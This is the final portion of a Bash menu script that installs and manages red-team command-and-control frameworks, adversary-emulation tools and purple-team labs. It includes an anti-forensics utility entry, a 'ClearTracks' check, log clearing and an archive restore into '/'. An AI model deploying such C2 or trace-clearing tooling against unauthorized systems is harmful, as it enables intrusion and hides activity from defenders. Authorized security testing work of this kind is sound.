                log "ERROR" "Invalid choice. Please enter a number between 1 and 10."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_purple_team_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                           PURPLE TEAM OPERATIONS                            ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1. ${BLUE}Install Purple Team Tools${NC}"
        echo -e "2. ${BLUE}Install Threat Hunting Tools${NC}"
        echo -e "3. ${BLUE}Install Adversary Emulation Tools${NC}"
        echo -e "4. ${BLUE}Start VECTR Platform${NC}"
        echo -e "5. ${BLUE}Start Detection Lab${NC}"
        echo -e "6. ${BLUE}Generate Purple Team Report${NC}"
        echo -e "7. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-7]: ${NC}"
        read purple_choice
        
        case $purple_choice in
            1) install_purple_team_tools; read -p "Press Enter to continue...";;
            2) install_threat_hunting_tools; read -p "Press Enter to continue...";;
            3) install_adversary_emulation_tools; read -p "Press Enter to continue...";;
            4) 
                if [[ -d "$TOOLS_DIR/VECTR" ]]; then
                    cd "$TOOLS_DIR/VECTR" && docker-compose up -d
                    log "SUCCESS" "VECTR platform started"
                else
                    log "ERROR" "VECTR not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                if [[ -d "$TOOLS_DIR/DetectionLab" ]]; then
                    cd "$TOOLS_DIR/DetectionLab" && vagrant up
                    log "SUCCESS" "Detection Lab started"
                else
                    log "ERROR" "Detection Lab not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            6) 
                log "INFO" "Purple team report generation would be implemented"
                read -p "Press Enter to continue..."
                ;;
            7) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 7."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_tools_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                            SECURITY TOOLS MANAGEMENT                        ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install All Tools${NC}"
        echo -e "2.  ${BLUE}Update All Tools${NC}"
        echo -e "3.  ${BLUE}Tool Status Check${NC}"
        echo -e "4.  ${BLUE}Remove Tools${NC}"
        echo -e "5.  ${BLUE}Backup Configuration${NC}"
        echo -e "6.  ${BLUE}Restore Configuration${NC}"
        echo -e "7.  ${BLUE}Clean Temporary Files${NC}"
        echo -e "8.  ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-8]: ${NC}"
        read tools_choice
        
        case $tools_choice in
            1) 
                log "INFO" "Installing all security tools..."
                install_caldera
                install_atomic_red_team
                install_empire
                install_covenant
                install_sliver
                install_mythic
                install_purple_team_tools
                install_threat_hunting_tools
                install_adversary_emulation_tools
                log "SUCCESS" "All tools installation complete"
                read -p "Press Enter to continue..."
                ;;
            2) 
                log "INFO" "Updating all tools..."
                [[ -d "$CALDERA_DIR" ]] && update_caldera
                [[ -d "$ATOMIC_RED_TEAM_DIR" ]] && (cd "$ATOMIC_RED_TEAM_DIR" && git pull)
                [[ -d "$EMPIRE_DIR" ]] && (cd "$EMPIRE_DIR" && git pull)
                [[ -d "$COVENANT_DIR" ]] && (cd "$COVENANT_DIR" && git pull)
                log "SUCCESS" "All tools updated"
                read -p "Press Enter to continue..."
                ;;
            3) 
                echo -e "${GREEN}Tool Status Check:${NC}"
                echo -e "Caldera: $([[ -d "$CALDERA_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Atomic Red Team: $([[ -d "$ATOMIC_RED_TEAM_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Empire: $([[ -d "$EMPIRE_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Covenant: $([[ -d "$COVENANT_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Sliver: $([[ -f "$TOOLS_DIR/sliver-server" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Mythic: $([[ -d "$MYTHIC_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                read -p "Press Enter to continue..."
                ;;
            4) 
                echo -e "${RED}WARNING: This will remove all installed tools!${NC}"
                read -p "Are you sure? (type 'DELETE' to confirm): " confirm
                if [[ "$confirm" == "DELETE" ]]; then
                    rm -rf "$TOOLS_DIR"
                    log "SUCCESS" "All tools removed"
                else
                    log "INFO" "Operation cancelled"
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                backup_file="$BACKUP_DIR/config_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
                tar -czf "$backup_file" "$CONFIG_FILE" "$TOOLS_DIR"/*.conf 2>/dev/null
                log "SUCCESS" "Configuration backed up to $backup_file"
                read -p "Press Enter to continue..."
                ;;
            6) 
                echo "Available backups:"
                ls -la "$BACKUP_DIR"/*.tar.gz 2>/dev/null
                read -p "Enter backup filename to restore: " backup_name
                if [[ -f "$BACKUP_DIR/$backup_name" ]]; then
                    tar -xzf "$BACKUP_DIR/$backup_name" -C /
                    log "SUCCESS" "Configuration restored from $backup_name"
                else
                    log "ERROR" "Backup file not found"
                fi
                read -p "Press Enter to continue..."
                ;;
            7) 
                rm -rf "$TEMP_DIR"
                mkdir -p "$TEMP_DIR"
                find /tmp -name "redteam_*" -type d -exec rm -rf {} + 2>/dev/null
                log "SUCCESS" "Temporary files cleaned"
                read -p "Press Enter to continue..."
                ;;
            8) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 8."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_main_menu() {
    while true; do
        banner
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                              MAIN MENU                                      ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}MITRE Caldera Operations${NC}"
        echo -e "2.  ${BLUE}Atomic Red Team Tests${NC}"
        echo -e "3.  ${BLUE}Command & Control Frameworks${NC}"
        echo -e "4.  ${BLUE}Purple Team Operations${NC}"
        echo -e "5.  ${BLUE}Security Tools Management${NC}"
        echo -e "6.  ${BLUE}Utility Tools (DNS/Anti-Forensics)${NC}"
        echo -e "7.  ${BLUE}Comprehensive Cheatsheet${NC}"
        echo -e "8.  ${BLUE}MITRE ATT&CK Matrix${NC}"
        echo -e "9.  ${BLUE}System Information${NC}"
        echo -e "10. ${BLUE}Configuration Settings${NC}"
        echo -e "11. ${BLUE}View Logs${NC}"
        echo -e "12. ${BLUE}About & Help${NC}"
        echo -e "13. ${BLUE}Exit${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-13]: ${NC}"
        read main_choice
        
        case $main_choice in
            1) show_caldera_menu;;
            2) show_atomic_menu;;
            3) show_c2_menu;;
            4) show_purple_team_menu;;
            5) show_tools_menu;;
            6) show_utility_tools_menu;;
            7) show_comprehensive_cheatsheet;;
            8) show_mitre_attack_matrix;;
            9) show_system_info;;
            10) show_config_menu;;
            11) show_logs_menu;;
            12) show_about_help;;
            13) 
                cleanup_and_exit
                ;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 13."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_config_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                          CONFIGURATION SETTINGS                             ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1. ${BLUE}View Current Configuration${NC}"
        echo -e "2. ${BLUE}Edit Configuration File${NC}"
        echo -e "3. ${BLUE}Reset to Defaults${NC}"
        echo -e "4. ${BLUE}Toggle Debug Mode${NC}"
        echo -e "5. ${BLUE}Toggle Auto Update${NC}"
        echo -e "6. ${BLUE}Toggle Backup${NC}"
        echo -e "7. ${BLUE}Set Tools Directory${NC}"
        echo -e "8. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-8]: ${NC}"
        read config_choice
        
        case $config_choice in
            1) 
                echo -e "${GREEN}Current Configuration:${NC}"
                cat "$CONFIG_FILE"
                read -p "Press Enter to continue..."
                ;;
            2) 
                ${EDITOR:-nano} "$CONFIG_FILE"
                source "$CONFIG_FILE"
                log "SUCCESS" "Configuration reloaded"
                ;;
            3) 
                read -p "Reset configuration to defaults? (y/n): " reset_choice
                if [[ "$reset_choice" =~ [yY] ]]; then
                    rm "$CONFIG_FILE"
                    init_config
                    log "SUCCESS" "Configuration reset to defaults"
                fi
                ;;
            4) 
                if [[ "$DEBUG_MODE" == "true" ]]; then
                    sed -i 's/DEBUG_MODE="true"/DEBUG_MODE="false"/' "$CONFIG_FILE"
                    log "INFO" "Debug mode disabled"
                else
                    sed -i 's/DEBUG_MODE="false"/DEBUG_MODE="true"/' "$CONFIG_FILE"
                    log "INFO" "Debug mode enabled"
                fi
                source "$CONFIG_FILE"
                ;;
            5) 
                if [[ "$AUTO_UPDATE" == "true" ]]; then
                    sed -i 's/AUTO_UPDATE="true"/AUTO_UPDATE="false"/' "$CONFIG_FILE"
                    log "INFO" "Auto update disabled"
                else
                    sed -i 's/AUTO_UPDATE="false"/AUTO_UPDATE="true"/' "$CONFIG_FILE"
                    log "INFO" "Auto update enabled"
                fi
                source "$CONFIG_FILE"
                ;;
            6) 
                if [[ "$BACKUP_ENABLED" == "true" ]]; then
                    sed -i 's/BACKUP_ENABLED="true"/BACKUP_ENABLED="false"/' "$CONFIG_FILE"
                    log "INFO" "Backup disabled"
                else
                    sed -i 's/BACKUP_ENABLED="false"/BACKUP_ENABLED="true"/' "$CONFIG_FILE"
                    log "INFO" "Backup enabled"
                fi
                source "$CONFIG_FILE"
                ;;
            7) 
                read -p "Enter new tools directory path: " new_path
                if [[ -n "$new_path" ]]; then
                    sed -i "s|TOOLS_DIR=.*|TOOLS_DIR=\"$new_path\"|" "$CONFIG_FILE"
                    source "$CONFIG_FILE"
                    mkdir -p "$TOOLS_DIR"
                    log "SUCCESS" "Tools directory updated to $new_path"
                fi
                ;;
            8) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 8."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_logs_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                               LOG VIEWER                                    ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1. ${BLUE}View Script Logs${NC}"
        echo -e "2. ${BLUE}View Caldera Logs${NC}"
        echo -e "3. ${BLUE}View System Logs${NC}"
        echo -e "4. ${BLUE}Clear All Logs${NC}"
        echo -e "5. ${BLUE}Export Logs${NC}"
        echo -e "6. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-6]: ${NC}"
        read logs_choice
        
        case $logs_choice in
            1) 
                if [[ -f "$LOG_FILE" ]]; then
                    tail -n 50 "$LOG_FILE"
                    echo -e "${BLUE}--- End of logs ---${NC}"
                else
                    log "WARNING" "No script logs found"
                fi
                read -p "Press Enter to continue..."
                ;;
            2) 
                if [[ -f "$CALDERA_DIR/logs/caldera.log" ]]; then
                    tail -n 50 "$CALDERA_DIR/logs/caldera.log"
                else
                    log "WARNING" "No Caldera logs found"
                fi
                read -p "Press Enter to continue..."
                ;;
            3) 
                echo "Recent system events:"
                journalctl --since "1 hour ago" --no-pager | tail -20
                read -p "Press Enter to continue..."
                ;;
            4) 
                read -p "Clear all logs? (y/n): " clear_choice
                if [[ "$clear_choice" =~ [yY] ]]; then
                    > "$LOG_FILE"
                    [[ -f "$CALDERA_DIR/logs/caldera.log" ]] && > "$CALDERA_DIR/logs/caldera.log"
                    log "SUCCESS" "All logs cleared"
                fi
                ;;
            5) 
                export_file="$BACKUP_DIR/logs_export_$(date +%Y%m%d_%H%M%S).tar.gz"
                tar -czf "$export_file" "$LOG_FILE" "$CALDERA_DIR/logs"/* 2>/dev/null
                log "SUCCESS" "Logs exported to $export_file"
                read -p "Press Enter to continue..."
                ;;
            6) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 6."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_about_help() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                           ABOUT & HELP                                      ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    cat << 'EOF'

═══════════════════════════════════════════════════════════════════════════════
                         ULTIMATE RED TEAM AUTOMATION v3.0
═══════════════════════════════════════════════════════════════════════════════

DESCRIPTION:
This comprehensive security framework provides automated installation, 
configuration, and management of various red team, blue team, and purple team 
security tools aligned with the MITRE ATT&CK framework.

FEATURES:
• MITRE Caldera adversary emulation platform
• Atomic Red Team automated testing
• Multiple C2 frameworks (Empire, Covenant, Sliver, Mythic)
• Purple team collaboration tools
• Threat hunting and detection tools
• Comprehensive security cheatsheets
• MITRE ATT&CK matrix integration
• Automated tool management and updates

SUPPORTED TOOLS:
• MITRE Caldera - Automated adversary emulation
• Atomic Red Team - Portable detection tests
• PowerShell Empire - Post-exploitation framework
• Covenant - .NET C2 framework
• Sliver - Cross-platform C2 framework
• Mythic - Collaborative post-exploitation framework
• VECTR - Purple team tracking platform
• Detection Lab - Threat detection laboratory
• HELK - Threat hunting ELK stack
• Sigma Rules - Generic detection rules

SYSTEM REQUIREMENTS:
• Linux/macOS/Windows with WSL
• Python 3.6+
• Docker (for some tools)
• Git
• Minimum 8GB RAM recommended
• 50GB+ free disk space

USAGE GUIDELINES:
• For authorized security testing only
• Ensure proper permissions before use
• Follow responsible disclosure practices
• Keep tools updated regularly
• Maintain operational security

SUPPORT:
• Documentation: Built-in help system
• Configuration: Automated setup and management
• Logging: Comprehensive activity tracking
• Backup: Automatic configuration backups

DISCLAIMER:
This tool is intended for educational and authorized security testing purposes 
only. Users are responsible for ensuring compliance with applicable laws and 
regulations. Unauthorized use is strictly prohibited.

VERSION: 3.0
AUTHOR: Enhanced Security Framework
LICENSE: Educational Use Only

═══════════════════════════════════════════════════════════════════════════════

QUICK START GUIDE:
1. Run the script with appropriate permissions
2. Install desired tools from the Tools Management menu
3. Configure settings as needed
4. Start with Atomic Red Team for basic testing
5. Progress to advanced frameworks like Caldera
6. Use Purple Team tools for collaborative security exercises

TROUBLESHOOTING:
• Check system dependencies if installation fails
• Review logs for detailed error information
• Ensure sufficient disk space and permissions
• Verify network connectivity for downloads
• Consult documentation for specific tool issues

EOF
    
    read -p "Press Enter to continue..."
}

cleanup_and_exit() {
    log "INFO" "Shutting down Ultimate Red Team Automation..."
    
    # Stop running processes
    [[ -n "$CALDERA_PID" ]] && kill "$CALDERA_PID" 2>/dev/null
    [[ -n "$EMPIRE_PID" ]] && kill "$EMPIRE_PID" 2>/dev/null
    [[ -n "$COVENANT_PID" ]] && kill "$COVENANT_PID" 2>/dev/null
    
    # Clean up temporary files
    rm -rf "$TEMP_DIR"
    
    # Final backup if enabled
    if [[ "$BACKUP_ENABLED" == "true" ]]; then
        backup_file="$BACKUP_DIR/final_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
        tar -czf "$backup_file" "$CONFIG_FILE" 2>/dev/null
        log "INFO" "Final backup created: $backup_file"
    fi
    
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                     THANK YOU FOR USING                                     ║${NC}"
    echo -e "${GREEN}║              ULTIMATE RED TEAM AUTOMATION v$VERSION                         ║${NC}"
    echo -e "${GREEN}║                                                                              ║${NC}"
    echo -e "${GREEN}║              Stay secure and test responsibly!                              ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    log "SUCCESS" "Script shutdown complete"
    exit 0
}

# ============================================================================
#                              SIGNAL HANDLERS
# ============================================================================

trap 'log "WARNING" "Script interrupted by user"; cleanup_and_exit' INT TERM
trap 'cleanup_and_exit' EXIT

# ============================================================================
#                              MAIN EXECUTION
# ============================================================================

main() {
    # Initial setup
    detect_os
    check_root
    check_dependencies
    init_config
    
    # Welcome message
    log "SUCCESS" "Ultimate Red Team Automation v$VERSION started successfully"
    log "INFO" "Operating System: $OS_PRETTY"
    log "INFO" "Configuration loaded from: $CONFIG_FILE"
    log "INFO" "Tools directory: $TOOLS_DIR"
    log "INFO" "Log file: $LOG_FILE"
    
    # RedHunt OS specific message
    if [[ "$OS_NAME" == "redhunt" ]]; then
        log "INFO" "RedHunt OS detected - Security tools pre-installed"
        log "INFO" "Snap support: $([[ "$SNAP_AVAILABLE" == "true" ]] && echo "Available" || echo "Not Available")"
    fi
    
    # Check for existing installations
    log "INFO" "Checking existing tool installations..."
    [[ -d "$CALDERA_DIR" ]] && log "INFO" "✓ MITRE Caldera found"
    [[ -d "$ATOMIC_RED_TEAM_DIR" ]] && log "INFO" "✓ Atomic Red Team found"
    [[ -f "$TOOLS_DIR/dns_changer_eye.py" ]] && log "INFO" "✓ DNS Changer Eye found"
    [[ -f "$TOOLS_DIR/cleartracks.sh" ]] && log "INFO" "✓ ClearTracks found"
    
    # Start main menu loop
    show_main_menu
}

# Start the script
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
